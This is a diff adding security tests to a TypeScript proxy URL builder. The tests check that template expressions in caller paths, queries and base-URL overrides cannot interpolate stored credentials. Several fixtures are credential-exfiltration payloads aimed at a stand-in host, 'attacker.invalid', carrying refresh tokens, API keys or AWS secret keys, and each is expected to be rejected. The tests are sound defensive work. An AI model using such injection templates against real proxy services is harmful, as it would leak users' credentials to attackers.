@@ -21,7 +21,7 @@ import {
 } from './utils.js';
 import { getDefaultProxy } from './utils.test.js';
 
-import type { InternalProxyConfiguration, TwoStepCredentials, UserProvidedProxyConfiguration } from '@nangohq/types';
+import type { AllAuthCredentials, InternalProxyConfiguration, TwoStepCredentials, UserProvidedProxyConfiguration } from '@nangohq/types';
 
 describe('buildProxyHeaders', () => {
     it('should correctly construct a header using an api key with multiple headers', () => {
@@ -1097,6 +1097,137 @@ describe('enforceProxyOutboundUrlPolicy', () => {
 });
 
 describe('buildProxyURL', () => {
+    describe('caller-controlled URL templates', () => {
+        it.each<{ placeholder: string; credentials: AllAuthCredentials }>([
+            { placeholder: 'access_token', credentials: { type: 'OAUTH2', access_token: 'secret-access-token', raw: {} } },
+            { placeholder: 'refresh_token', credentials: { type: 'OAUTH2', access_token: 'token', refresh_token: 'secret-refresh-token', raw: {} } },
+            { placeholder: 'credentials.raw.secret', credentials: { type: 'OAUTH2', access_token: 'token', raw: { secret: 'secret-raw-value' } } },
+            { placeholder: 'apiKey', credentials: { type: 'API_KEY', apiKey: 'secret-api-key' } },
+            { placeholder: 'token', credentials: { type: 'TWO_STEP', token: 'secret-token', raw: {} } },
+            { placeholder: 'username', credentials: { type: 'BASIC', username: 'secret-username', password: 'secret-password' } },
+            { placeholder: 'password', credentials: { type: 'BASIC', username: 'user', password: 'secret-password' } },
+            {
+                placeholder: 'client_certificate',
+                credentials: {
+                    type: 'OAUTH2_CC',
+                    token: 'token',
+                    client_id: 'client-id',
+                    client_secret: 'client-secret',
+                    client_certificate: 'secret-certificate',
+                    client_private_key: 'secret-private-key',
+                    raw: {}
+                }
+            },
+            {
+                placeholder: 'client_private_key',
+                credentials: {
+                    type: 'OAUTH2_CC',
+                    token: 'token',
+                    client_id: 'client-id',
+                    client_secret: 'client-secret',
+                    client_certificate: 'secret-certificate',
+                    client_private_key: 'secret-private-key',
+                    raw: {}
+                }
+            }
+        ])('rejects $placeholder expressions in caller paths and queries', ({ placeholder, credentials }) => {
+            const expression = '${' + placeholder + '}';
+            const connection = getTestConnection({ credentials });
+            for (const endpoint of [`/api/${expression}`, `/api?secret=${expression}`]) {
+                expect(() =>
+                    buildProxyURL({
+                        config: getDefaultProxy({ provider: { proxy: { base_url: 'https://example.com' } }, endpoint }),
+                        connection
+                    })
+                ).toThrow(expect.objectContaining({ code: 'invalid_proxy_url' }));
+            }
+        });
+
+        it.each(['connection_config.secret', 'connectionConfig.secret', 'metadata.secret', 'missing', 'base64(${refresh_token})'])(
+            'rejects %s expressions even with a caller-supplied fallback host',
+            (placeholder) => {
+                expect(() =>
+                    buildProxyURL({
+                        config: getDefaultProxy({
+                            provider: { proxy: { base_url: 'https://example.com' } },
+                            endpoint: '/${' + placeholder + '}||https://attacker.invalid/${refresh_token}'
+                        }),
+                        connection: getTestConnection({
+                            credentials: { type: 'OAUTH2', access_token: 'token', refresh_token: 'secret-refresh-token', raw: {} },
+                            connection_config: { secret: 'secret-config-value' },
+                            metadata: { secret: 'secret-metadata-value' }
+                        })
+                    })
+                ).toThrow(expect.objectContaining({ code: 'invalid_proxy_url' }));
+            }
+        );
+
+        it.each([
+            'https://attacker.invalid/${apiKey}',
+            'https://attacker.invalid?secret=${apiKey}',
+            '${connectionConfig.hostname} || https://attacker.invalid'
+        ])('rejects template expressions in base URL override %s', (baseUrlOverride) => {
+            expect(() =>
+                buildProxyURL({
+                    config: getDefaultProxy({
+                        provider: { proxy: { base_url: 'https://example.com' } },
+                        baseUrlOverride
+                    }),
+                    connection: getTestConnection({ connection_config: { hostname: 'https://example.com' } })
+                })
+            ).toThrow(expect.objectContaining({ code: 'invalid_proxy_url' }));
+        });
+
+        it('preserves encoded caller expressions, fallback syntax, and connectionConfig text as opaque data', () => {
+            const endpoint = '/connectionConfig/%24%7Brefresh_token%7D?connectionConfig=%24%7Bcredentials.raw.secret%7D||https://attacker.invalid';
+            const url = buildProxyURL({
+                config: getDefaultProxy({
+                    provider: { proxy: { base_url: 'https://${connectionConfig.hostname}' } },
+                    endpoint
+                }),
+                connection: getTestConnection({
+                    credentials: { type: 'OAUTH2', access_token: 'token', refresh_token: 'secret-refresh-token', raw: { secret: 'secret-raw-value' } },
+                    connection_config: { hostname: 'example.com' }
+                })
+            });
+
+            expect(url).toBe('https://example.com' + endpoint);
+        });
+
+        it('strips a resolved provider base from absolute caller endpoints', () => {
+            const url = buildProxyURL({
+                config: getDefaultProxy({
+                    provider: { proxy: { base_url: 'https://${connectionConfig.hostname}/v1/' } },
+                    endpoint: 'https://example.com/v1/users'
+                }),
+                connection: getTestConnection({ connection_config: { hostname: 'example.com' } })
+            });
+
+            expect(url).toBe('https://example.com/v1/users');
+        });
+
+        it('does not reinterpret expressions returned by a trusted provider template', () => {
+            expect(() =>
+                buildProxyURL({
+                    config: getDefaultProxy({ provider: { proxy: { base_url: '${connectionConfig.base_url}' } } }),
+                    connection: getTestConnection({ connection_config: { base_url: 'https://attacker.invalid/${apiKey}' } })
+                })
+            ).toThrow(expect.objectContaining({ code: 'invalid_proxy_url' }));
+        });
+
+        it('treats base URL override paths as opaque data', () => {
+            const url = buildProxyURL({
+                config: getDefaultProxy({
+                    provider: { proxy: { base_url: 'https://${connectionConfig.hostname}' } },
+                    baseUrlOverride: 'https://override.example.com/connectionConfig/%24%7BapiKey%7D||literal'
+                }),
+                connection: getTestConnection()
+            });
+
+            expect(url).toBe('https://override.example.com/connectionConfig/%24%7BapiKey%7D||literal/api/test');
+        });
+    });
+
     it('uses AWS SigV4 per-connection base_url when no explicit override is set', () => {
         const config = getDefaultProxy({
             provider: {
@@ -1120,6 +1251,30 @@ describe('buildProxyURL', () => {
         });
 
         expect(buildProxyURL({ config, connection })).toBe('http://localhost:4566/tables');
+    });
+
+    it('rejects templates in AWS SigV4 per-connection overrides, while preserving explicit override precedence', () => {
+        const config = getDefaultProxy({
+            provider: { auth_mode: 'AWS_SIGV4', proxy: { base_url: 'https://dynamodb.us-east-1.amazonaws.com' } }
+        });
+        const connection = getTestConnection({
+            credentials: {
+                type: 'AWS_SIGV4',
+                raw: {},
+                role_arn: 'arn:aws:iam::123456789012:role/TestRole',
+                region: 'us-east-1',
+                service: 'dynamodb',
+                access_key_id: 'AKIDEXAMPLE',
+                secret_access_key: 'secret',
+                session_token: 'token'
+            },
+            connection_config: { base_url: 'https://attacker.invalid/${secret_access_key}' }
+        });
+
+        expect(() => buildProxyURL({ config, connection })).toThrow(expect.objectContaining({ code: 'invalid_proxy_url' }));
+        expect(buildProxyURL({ config: { ...config, baseUrlOverride: 'https://sts.us-east-1.amazonaws.com' }, connection })).toBe(
+            'https://sts.us-east-1.amazonaws.com/api/test'
+        );
     });
 
     it('should correctly construct url with no trailing slash and no leading slash', () => {
